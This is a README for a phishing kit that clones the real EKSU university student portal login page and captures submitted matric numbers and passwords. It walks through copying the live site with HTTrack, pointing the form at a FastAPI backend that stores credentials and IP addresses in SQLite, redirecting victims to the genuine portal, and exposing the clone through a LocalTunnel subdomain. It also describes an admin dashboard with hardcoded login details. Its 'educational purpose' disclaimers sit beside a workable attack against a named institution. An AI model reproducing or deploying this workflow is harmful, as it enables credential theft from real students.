

<<<<<<< >>>>>>>

# README from E7 Security:


# Eksu_Cloner
This project showcases how a publicly accessible login portal can be cloned, altered, 
and wired into a backend system  that captures and stores submitted credentials.
=======
# EKSU Portal Login Cloner 🔐

A cloned version of the Eksu Portal login page, built using FastAPI and SQLite, with the 
frontend extracted using HTTrack and modified for backend processing. This tool captures 
login credentials for learning, research, and ethical penetration testing purposes only.

> ⚠️ **Disclaimer**: This project is strictly for educational purposes 
(ethical hacking, security research, UI cloning demonstration).
Unauthorized use of user data is illegal and unethical.

---

## 🧠 Project Overview

The purpose is to educate about phishing risks and build awareness 
around digital safety.

---


## 📚 Table of Contents

- [🎯 Overview](#-eksu-portal-cloner-educational-purpose-only)
- [🛠️ Tools & Tech Stack](#-tools--tech-stack)
- [📈 Workflow Breakdown](#-workflow-breakdown)
- [🚀 How to Run the Project](#-how-to-run-the-project)
- [🧑‍💼 Admin Panel/Dashboard](#-admin-paneldashboard)
- [🧰 Features](#-features)
- [🧪 Debugging Tips](#-debugging-tips)
- [🧾 Project Directory](#-project-directory)
- [🧱 Security & Secrets](#-security--secrets)
- [🤝 Contributing](#-contributing)
- [⚖️ Legal & Ethical Notice](#-legal--ethical-notice)




## 🧰 Tools & Tech Stack

| Tool        | Use                                  |
|-------------|---------------------------------------|
| **HTTrack** | Website cloning (extract EKSU portal UI) |
| **FastAPI** | Backend API & routing                |
| **SQLite3** | Simple database for storing credentials |
| **Poetry**  | Dependency and project management     |
| **LocalTunnel** | To expose localhost for testing on the internet |

---

## 🔄 Workflow Breakdown


###1. Clone the EKSU Portal (Using HTTrack) 
HTTrack was used to clone the real EKSU portal page locally:

```bash
httrack "https://eksuportal.eksu.edu.ng/login" -O ./eksu_clone


### 2. Extract and Customize HTML

From the HTTrack result:

    The cloned login.html page was moved to app/templates/login.html.

    The form's action attribute was modified to point to a custom FastAPI backend route.
    
   HTML: <form action="/login" method="post">
   The above ensures the form submits to your custom FastAPI endpoint.
   All necessary assets (CSS, JS, images) were preserved under the static/ directory.


📁 Static Assets Setup:

     After cloning the portal using HTTrack, you'll find the static assets in:
     "/home/evidence/eksuportal.eksu.edu.ng/assets_ajax/"
   
     To ensure the login.html page properly loads CSS, JavaScript, and image files in your 
     FastAPI project, move the following subdirectories into the FastAPI static folder:

    # Move these folders using the 'mv' command.
    mv /cloned_portal_path/assets_ajax/css      /home/project_directory/app/static/app/static/
    mv /cloned_portal_path/assets_ajax/js       /home/project_directory/app/static/
    mv /cloned_portal_path/assets_ajax/img      /home/project_directory/app/static/
    mv /cloned_portal_path/assets_ajax/plugins  /home/project_directory/app/static/


✅ Ensure the directory structure under /home/project_directory/app/static/ looks like:
   
    app/static/
 ├── css/
 ├── js/
 ├── img/
 └── plugins/

This allows your login.html to correctly reference styles and scripts without broken links.


### 3. Build a FastAPI Backend:

    A simple FastAPI server is used to:

    Receive POST requests from the login form (/login)

    Captured credentials (matric number & password) are logged and saved to a local SQLite3 database. at app/db/credentials.db

    Redirected after submission to the real "https://eksuportal.eksu.edu.ng"
    
    
### 4. Database:

    SQLite3 is used for its simplicity.

    Each login attempt is recorded in the credentials table.

    You can inspect data from the '/home/project_directory/' using the 'sqlite3' command:
    
      sqlite3 app/db/credentials.db
      sqlite> .tables
      sqlite> SELECT * FROM credentials;

    
### 5. Expose Your Server Publicly:

       instead of using Ngrok or cloudflare (banned), this project uses LocalTunnel(Though can we changed in the future),:
      It generates a public HTTPS link (e.g., https://yourname.loca.lt) that can be sent to test victims or shown in demos.
      And required a password which can be get using " curl https://loca.lt/mytunnelpassword 
    " OR " https://loca.lt/mytunnelpassword" OR "wget -q -O - https://loca.lt/mytunnelpassword" 
    
    

### 6. 🔐 Admin Panel/Dashboard:

       The Admin Dashboard provides a secure interface to view all submitted login credentials
       captured through the cloned portal. It displays a table with each record’s:

       Username and password (as submitted)

      Timestamp of submission

      IP address of the user

      This tool allows administrators or penetration testers to monitor login attempts
      in real time for analysis and educational research.
      
      Visit " http://localhost:8000/admin?auth=letmein" to access the admin dashboard.
      
      
    6.1  🔐 Admin Login System

        E7-Security implemented a secure admin login page with hashed password authentication.

        Session-based login persistence using SessionMiddleware.

        Unauthorized users are redirected to the login page automatically.
      
    6.2 📋 Admin Dashboard

        E7-Security created a modern, responsive dashboard to view captured credentials.

        Table includes: ID, Username, Password, Timestamp, and IP Address.

        Live data fetched from a SQLite3 database and rendered dynamically using Jinja2.
        
        
        To access the Admin Dashboard, you go to the route:
           http://127.0.0.1:8000/admin/login
           
           Admin_Id: 731666:
           Password: AdminPass001@
        
        After login, you’ll be redirected to /admin/dashboard to see logs.
        
    
### 7. 📦 Environment Configuration

         Added a .env file (SECRET_KEY) for better security practice.

         Loaded securely using python-dotenv and ignored from Git tracking.

     7.1 🔒 Security & Secrets

         .env now holds SECRET_KEY for session middleware.
  
         Secrets are excluded from Git using .gitignore.  
         
          
    
### 8. ✅ IP Address Logging Summary

      The system automatically logs the IP address of every user that submits the login form. This feature:

      Captures the client IP using request.client.host

      Stores the IP alongside the submitted credentials and timestamp

      Helps track where requests are originating from (e.g., local vs external devices)

      This logging supports auditing and analysis of network sources involved in testing scenarios.


eksu_cloner/
├── app/
│   ├── main.py
│   ├── routes/
│   │   ├── __init__.py
│   │   ├── admin.py
│   │   ├── login.py
│   ├── utils/
│   │   └── db.py
│   ├── templates/
│   │   ├── index.html
│   │   ├── login.html
│   │   ├── admin_login.html
│   │   └── admin_dashboard.html
│   ├── static/
│   │   ├── css/
│   │   ├── js/
│   │   └── img/
├── credentials.db
├── .env
├── README.md
├── pyproject.toml
├── secret_key.env


## 🚀 How to Run the Project

### 1. Clone the Repo:
```bash

   git clone https://github.com/your-username/eksu_cloner.git
   cd eksu_cloner
   
   
### 2. Install Dependencies:

       poetry install

### 3.Activate the Environment:

      poetry shell

### 4. Start the Server:
      uvicorn app.main:app --reload


### 5. 🌍 Expose to Internet
      " lt --port 8000 --subdomain eksu-portal" (TO BE RUN IN ANOTHER TAB OR TERMINAL)
      then you receive a public link.

💾 View Captured Data:
     You can view user captured data via two methods
      ** Admin DashBoard
      ** Sqlite3 Database
      
      To inspect via the database:
         " sqlite3 app/db/credentials.db "
      
          Then inside SQLite shell:
            " .tables "
           " SELECT * FROM credentials;".
           
      To inspect via Admin dashboard:
         after running your code;
           Visit " http://localhost:8000/admin?auth=letmein" to access the admin dashboard.
       
  🤝 Contributing

We welcome contributions from developers, ethical hackers, and cybersecurity enthusiasts
 who are passionate about educational tools and research-driven development.

Whether you want to:

    Improve the admin dashboard interface

    Extend features like IP tracking, device fingerprinting, or real-time monitoring

    Add authentication, logging, or data visualization

    Refactor the backend for performance or scalability

    Help with documentation or translations

Your input is highly appreciated!

To contribute:

    Fork the repository

    Create a new branch for your feature or fix

    Commit your changes with clear messages

    Open a pull request — we’ll review and discuss it together

    This project is built for ethical, educational, and research purposes only. Let’s collaborate responsibly.
  
  🧰 Features

     ✅ Cloned UI of EKSU Login Page
     ✅ SQLite3 database-backed credential storage
     ✅ IP Address logging on login attempt
     ✅ Admin-authenticated dashboard
     ✅ Tailwind-powered clean dashboard UI
     ✅ Secure secret key handling via .env file
     ✅ Ngrok/Cloudflare Tunnel compatible for public testing
     ✅ Ethical notice and intended academic use


🧪 Debugging Tips

    Static Files Not Loading?

        Make sure static/ folder is in the correct location and included in app.mount()

        Clear browser cache when testing updates.
        
   Check If Data Logged:
   
    --bash 
    
     sqlite3 eksu_credentials.db
    SELECT * FROM credentials LIMIT 5;


🧱 Security & Secrets

    All sensitive values (like SECRET_KEY) are stored in a .env file and loaded with python-dotenv.

    Ensure .env is added to .gitignore:
    
    --bash:
      .env
       secret.key.env
       *.db

    

 ⚠️ Legal & Ethical Notice

This project is strictly for ethical research and learning purposes. Do not use this project for illegal activities, 
phishing, or unauthorized data collection. Always obtain proper consent before simulating login pages or collecting 
sensitive data.
Do NOT deploy or use this tool on any real or unauthorized system.

🧠 Author: 

    Evidence SOG
    
    GitHub: @evidencesog

>>>>>>> fcc6779 (Initial commit for eksu portal cloner)
